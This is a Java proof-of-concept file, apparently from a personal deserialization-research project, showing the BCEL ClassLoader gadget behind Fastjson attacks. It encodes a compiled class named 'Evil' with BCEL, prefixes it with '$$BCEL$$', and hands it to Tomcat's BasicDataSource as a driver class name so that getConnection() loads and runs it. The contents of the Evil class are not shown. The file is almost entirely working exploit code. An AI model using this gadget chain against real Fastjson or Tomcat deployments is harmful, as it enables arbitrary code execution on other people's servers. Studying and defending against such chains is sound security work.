package FastJson;

import Bean.Evil;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.SQLException;


public class BCELTest {


    /**
     * 字节数组转16进制
     * @param bytes 需要转换的byte数组
     * @return  转换后的Hex字符串
     */
    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if (hex.length() < 2) {
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }

    public static String getEvilClass(){
        String pwd = "/Users/xiaofeixiong/IdeaProjects/SecDemo/unserilal-demo/target/classes/Bean/Evil.class";
        byte[] data = null;
        String cipher = null;
        try {
            Path tempPath = new File(pwd).toPath();
            System.out.println(tempPath.toString());
            data = Files.readAllBytes(tempPath);
//            System.out.println(bytesToHex(data));
            JavaClass cls =  Repository.lookupClass(Evil.class);
            cipher = Utility.encode(cls.getBytes(),true);
//            System.out.println(bytesToHex(Utility.decode(cipher,false)));

        } catch (IOException e) {
            e.printStackTrace();
        }
        return cipher;
    }

    public static void main(String[] args) throws SQLException {
//        BCEL 编码原理
        String evilClass = getEvilClass();
        System.out.println(evilClass);
        BasicDataSource basicDataSource = new BasicDataSource();
        basicDataSource.setDriverClassLoader(new ClassLoader());
        basicDataSource.setDriverClassName("$$BCEL$$" + evilClass);
        basicDataSource.getConnection();
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.toString();


    }
}
